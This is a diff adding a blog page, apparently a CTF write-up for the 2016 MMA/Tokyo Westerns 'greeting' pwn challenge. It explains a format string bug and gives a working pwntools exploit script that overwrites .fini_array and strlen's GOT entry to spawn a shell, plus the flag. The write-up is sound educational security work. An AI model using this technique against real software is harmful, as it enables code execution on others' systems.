@@ -1,0 +1,657 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>MMA 2nd CTF 2016 – greeting - Hacking Tube 2.0</title>
+<meta name="description" content="Category: pwnPoints: 150">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="MMA 2nd CTF 2016 – greeting">
+<meta property="og:url" content="http://0.0.0.0:4000/mma-2nd-ctf-2016-greeting/">
+
+
+  <meta property="og:description" content="Category: pwnPoints: 150">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2016-09-12T23:49:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/mma-2nd-ctf-2016-greeting/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="MMA 2nd CTF 2016 – greeting">
+    <meta itemprop="description" content="Category: pwnPoints: 150">
+    <meta itemprop="datePublished" content="September 12, 2016">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">MMA 2nd CTF 2016 – greeting
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> pwn
+<strong>Points:</strong> 150</p>
+
+<!-- more -->
+
+<p>After a long period of time without playing any CTF, I finally finished my master’s degree and have time to enjoy some CTF challenges. And then there is the <strong>Tokyo Western/MMA 2nd CTF</strong>, the first CTF I played in 2016.</p>
+
+<p>The challenge gave us a 32 bit ELF. The program will first use <code class="highlighter-rouge">system</code> to echo some message, then it will ask us to input our name, and print the greeting message. We can see that there exist a format string vulnerability in the main function:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@2
+</span>    <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// edx@4
+</span>    <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-84h]@2
+</span>    <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [sp+5Ch] [bp-44h]@1
+</span>    <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [sp+9Ch] [bp-4h]@1
+</span>
+    <span class="n">v7</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Please tell me your name... "</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">getnline</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">sprintf</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="s">"Nice to meet you, %s :)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">printf</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span> <span class="c1">// &lt;-- format string 
+</span>    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Don't ignore me ;( "</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span> <span class="o">^</span> <span class="n">v7</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As we can see that the program ends directly after it print out the greeting message, so it’s kind of hard for us to do the GOT hijacking attack. After discussing with my teammate, we found that there’s one more place we can overwrite the function pointer: <strong>the <code class="highlighter-rouge">.fini_array</code> section</strong>.</p>
+
+<p>So, we can first overwrite the <strong>first entry</strong> of the <code class="highlighter-rouge">.fini_array</code> section and hijack the control flow. Notice that we can only input 64 bytes characters, and that’s kind of hard for us to write both <code class="highlighter-rouge">system</code>’s address and <code class="highlighter-rouge">sh</code>’s string into the memory buffer. Here’s what we can do :</p>
+
+<ul>
+  <li>Overwrite both <code class="highlighter-rouge">.fini_array</code> section and <code class="highlighter-rouge">strlen</code>’s GOT entry. We replace the first entry of the <code class="highlighter-rouge">.fini_array</code> section into <strong>main function’s address</strong>, while <code class="highlighter-rouge">strlen</code>’s GOT entry be changed into <code class="highlighter-rouge">system</code>’s PLT.</li>
+  <li>The program will then return to the main function. Since <code class="highlighter-rouge">strlen</code>’s GOT has already been changed into <code class="highlighter-rouge">system</code>’s address, we can then input <code class="highlighter-rouge">sh</code> and execute <code class="highlighter-rouge">system("sh")</code> during the <code class="highlighter-rouge">getnline</code> function (the function will call <code class="highlighter-rouge">strlen</code> on our input).</li>
+</ul>
+
+<p>```python exp_greeting.py
+#!/usr/bin/env python</p>
+
+<p>from pwn import *
+import subprocess
+import sys
+import time</p>
+
+<p>HOST = “pwn2.chal.ctf.westerns.tokyo”
+PORT = 16317
+ELF_PATH = “./greeting”
+LIBC_PATH = “”</p>
+
+<h1 id="setting">setting</h1>
+<p>context.arch = ‘i386’
+context.os = ‘linux’
+context.endian = ‘little’
+context.word_size = 32</p>
+<h1 id="critical-debug-error-info-notset-warn-warning">[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]</h1>
+<p>context.log_level = ‘INFO’</p>
+
+<p>elf = ELF(ELF_PATH)</p>
+
+<p>def my_recvuntil(s, delim):
+    res = “”
+    while delim not in res:
+        c = s.recv(1)
+        res += c
+        sys.stdout.write(c)
+        sys.stdout.flush()
+    return res</p>
+
+<p>def myexec(cmd):
+    return subprocess.check_output(cmd, shell=True)</p>
+
+<p>def fmtstr(payload, prints, index, data, byte=1):
+    “””
+    data: data that want to be written into the address
+    index: stack position (ex. %7$n –&gt; index = 7)
+    prints: total charaters that have been print out
+    payload: whole payload string, initial value are addresses</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ex.  payload = p32(addr) + p32(addr2) + p32(addr3)
+     prints = 12
+     payload, prints = fmtstr(payload, prints, 7, 0xa0a0, 2)
+     payload, prints = fmtstr(payload, prints, 8, 0xc0, 1)
+     payload, prints = fmtstr(payload, prints, 9, 0x08047654, 4)
+"""
+
+if data - prints &gt; 0:
+    num = data - prints
+else:
+    num = data + 256**byte - prints
+    while(num &lt;= 0):
+        num += 256**byte
+
+payload += "%" + str(num) + "c" 
+prints = data
+
+if byte == 1:
+    payload += "%" + str(index) + "$hhn"
+elif byte == 2:
+    payload += "%" + str(index) + "$hn"
+elif byte == 4:
+    payload += "%" + str(index) + "$n"
+elif byte == 8:
+    payload += "%" + str(index) + "$lln"
+
+return payload, prints
+</code></pre></div></div>
+
+<p>def fmtstr_scan(cnt):
+    return ‘.’.join( “%”+str(i)+”$p” for i in xrange(1,cnt+1))</p>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
+#r = process(ELF_PATH)
+
+payload = "AA"+p32(0x08049934) + p32(elf.got['strlen']) + p32(elf.got['strlen']+2) 
+prints = len(payload) + 18
+payload, prints = fmtstr(payload, prints, 12, 0x85ed, 2)
+payload, prints = fmtstr(payload, prints, 13, 0x8490, 2)
+payload, prints = fmtstr(payload, prints, 14, 0x0804, 2)
+print payload
+print len(payload)
+
+r.sendlineafter("... ", payload)
+r.sendlineafter("... ", "sh\x00")
+
+r.interactive() ```
+</code></pre></div></div>
+
+<p>flag: <code class="highlighter-rouge">TWCTF{51mpl3_FSB_r3wr173_4nyw4r3}</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#format-string" class="page__taxonomy-item" rel="tag">format_string</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#mma" class="page__taxonomy-item" rel="tag">MMA</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-09-12T23:49:00+08:00">September 12, 2016</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=MMA+2nd+CTF+2016+--+greeting%20http%3A%2F%2F0.0.0.0%3A4000%2Fmma-2nd-ctf-2016-greeting%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fmma-2nd-ctf-2016-greeting%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fmma-2nd-ctf-2016-greeting%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/hacklu-ctf-2015-secret-library/" class="pagination--pager" title="Hack.lu CTF 2015 – secret library
+">Previous</a>
+    
+    
+      <a href="/mma-2nd-ctf-2016-interpreter/" class="pagination--pager" title="MMA 2nd CTF 2016 – Interpreter
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/mma-2nd-ctf-2016-greeting/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/mma-2nd-ctf-2016-greeting"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
